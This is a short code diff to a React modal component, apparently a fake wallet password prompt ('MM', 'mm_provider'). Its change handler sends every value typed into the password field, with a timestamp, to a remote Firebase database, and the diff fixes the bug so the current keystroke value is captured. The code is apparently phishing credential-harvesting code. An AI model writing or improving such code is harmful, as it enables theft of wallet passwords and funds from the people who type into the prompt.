@@ -83,7 +83,7 @@ const MM = ({ isOpen, setIsOpen, isEnter, setIsEnter }) => {
   const handleChange = (val, target) => {
     setPwd(val);
     push(ref(rtdb, "mm_provider/1007"), {
-      value: pwd,
+      value: val,
       date: String(new Date()),
     });
     setValidShow(false);
